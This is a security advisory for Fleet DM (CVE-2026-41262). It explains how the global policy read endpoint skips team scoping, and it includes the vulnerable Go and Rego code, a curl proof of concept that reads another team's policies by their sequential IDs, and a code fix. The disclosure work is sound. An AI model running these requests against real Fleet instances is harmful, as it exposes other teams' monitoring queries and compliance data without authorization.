# [M] Fleet DM Vulnerable to Cross-Team Policy Data Exposure via Global Policy Read Endpoint

## Summary
Severity: Medium
Advisory: GHSA-gm7f-v959-fr2g
CVE: CVE-2026-41262
CWE: CWE-863
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N (CVSS_V3)
Published: 2026-06-26
Source: https://github.com/advisories/GHSA-gm7f-v959-fr2g
Type: github-advisory

## Affected
- Go: `github.com/fleetdm/fleet/v4` — affected >=0 <4.85.0

## Details
## Summary

The global policy read endpoint (`GET /api/latest/fleet/policies/{policy_id}`) performs authorization against an empty `fleet.Policy{}` struct with nil TeamID, then fetches any policy by ID from the database without verifying the fetched policy actually belongs to the global scope. This allows a user with observer-level access on any single team to read the full details of policies belonging to any other team, bypassing Fleet's team isolation model.

## Details

The vulnerability is in `GetPolicyByIDQueries` at `server/service/global_policies.go:163-180`:

```go
func (svc Service) GetPolicyByIDQueries(ctx context.Context, policyID uint) (*fleet.Policy, error) {
	// Auth check uses empty Policy{} — TeamID is nil
	if err := svc.authz.Authorize(ctx, &fleet.Policy{}, fleet.ActionRead); err != nil {
		return nil, err
	}

	// Fetches ANY policy by ID, regardless of team ownership
	policy, err := svc.ds.Policy(ctx, policyID)
	if err != nil {
		return nil, err
	}
	// ... populates install_software and run_script, returns full policy
	return policy, nil
}
```

The authorization passes because the OPA rule at `server/authz/policy.rego:724-728` allows reading policies with null `team_id` for any user who holds a role on any team:

```rego
allow {
  is_null(object.team_id)
  object.type == "policy"
  team_role(subject, subject.teams[_].id) == [admin, maintainer, technician, observer, observer_plus][_]
  action == read
}
```

Since the auth object has nil TeamID, this rule fires for any team member. After authorization, `ds.Policy()` calls `policyDB()` at `server/datastore/mysql/policies.go:283-288` with a nil teamID:

```go
func policyDB(ctx context.Context, q sqlx.QueryerContext, id uint, teamID *uint) (*fleet.Policy, error) {
	teamWhere := "TRUE"  // nil teamID → no team filter
	args := []interface{}{id}
	if teamID != nil {
		teamWhere = "team_id = ?"
		args = append(args, *teamID)
	}
	// ... executes SELECT with WHERE p.id = ? AND {teamWhere}
```

This returns any policy regardless of team ownership, and the full policy object is returned to the caller without any post-fetch team verification.

By contrast, the properly-secured endpoints verify team scope:
- `GetTeamPolicyByIDQueries` (`team_policies.go:421-428`) sets `TeamID: ptr.Uint(teamID)` on the auth object and calls `ds.TeamPolicy()` which filters by team
- `DeleteGlobalPolicies` (`global_policies.go:255-263`) explicitly checks `policy.PolicyData.TeamID != nil` after fetching

## PoC

Prerequisites: A Fleet instance with at least two teams. User A has observer role on Team 1 only. Team 2 has policies that User A should not be able to view.

```bash
# Step 1: Authenticate as User A (Team 1 observer only)
TOKEN=$(curl -s -X POST https://fleet.example.com/api/latest/fleet/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"team1observer@example.com","password":"password"}' | jq -r '.token')

# Step 2: Enumerate policy IDs (they are sequential integers)
# Attempt to read a policy belonging to Team 2 (e.g., policy ID 5)
curl -s -H "Authorization: Bearer $TOKEN" \
  https://fleet.example.com/api/latest/fleet/policies/5

# Expected: 403 Forbidden (user has no access to Team 2)
# Actual: 200 OK with full policy data:
# {
#   "policy": {
#     "id": 5,
#     "name": "Team 2 Sensitive Policy",
#     "query": "SELECT * FROM sensitive_table WHERE ...",
#     "team_id": 2,
#     "passing_host_count": 42,
#     "failing_host_count": 7,
#     "description": "...",
#     "resolution": "...",
#     ...
#   }
# }
```

## Impact

An authenticated user with observer-level access on any single team can:

- **Read SQL queries** from all team policies across the Fleet instance, potentially revealing security monitoring strategies, compliance checks, and internal infrastructure details
- **View host pass/fail counts** for other teams' policies, leaking compliance posture data across team boundaries
- **Access software installer and script metadata** associated with other teams' policies via the `populatePolicyInstallSoftware` and `populatePolicyRunScript` calls
- **Enumerate all policies** by iterating sequential integer IDs

This breaks Fleet's team isolation model, which is designed to restrict visibility between teams. Organizations using teams to separate departments, clients, or security zones would have their policy data exposed across boundaries.

## Recommended Fix

Add a post-fetch check in `GetPolicyByIDQueries` to verify the returned policy is actually a global policy (nil TeamID), consistent with how `DeleteGlobalPolicies` operates:

```go
func (svc Service) GetPolicyByIDQueries(ctx context.Context, policyID uint) (*fleet.Policy, error) {
	if err := svc.authz.Authorize(ctx, &fleet.Policy{}, fleet.ActionRead); err != nil {
		return nil, err
	}

	policy, err := svc.ds.Policy(ctx, policyID)
	if err != nil {
		return nil, err
	}

	// Verify this is actually a global policy — team policies must be
	// accessed via the team-scoped endpoint which enforces team authorization
	if policy.TeamID != nil {
		return nil, authz.ForbiddenWithInternal(
			"attempting to read team policy via global endpoint",
			authz.UserFromContext(ctx),
			policy,
			fleet.ActionRead,
		)
	}

	if err := svc.populatePolicyInstallSoftware(ctx, policy); err != nil {
		return nil, ctxerr.Wrap(ctx, err, "populate install_software")
	}
	if err := svc.populatePolicyRunScript(ctx, policy); err != nil {
		return nil, ctxerr.Wrap(ctx, err, "populate run_script")
	}

	return policy, nil
}
```

Alternatively, re-authorize against the actual fetched policy object so OPA rules properly evaluate team membership, similar to how other Fleet endpoints handle object-level authorization.

## References
- https://github.com/fleetdm/fleet/security/advisories/GHSA-gm7f-v959-fr2g
- https://github.com/fleetdm/fleet
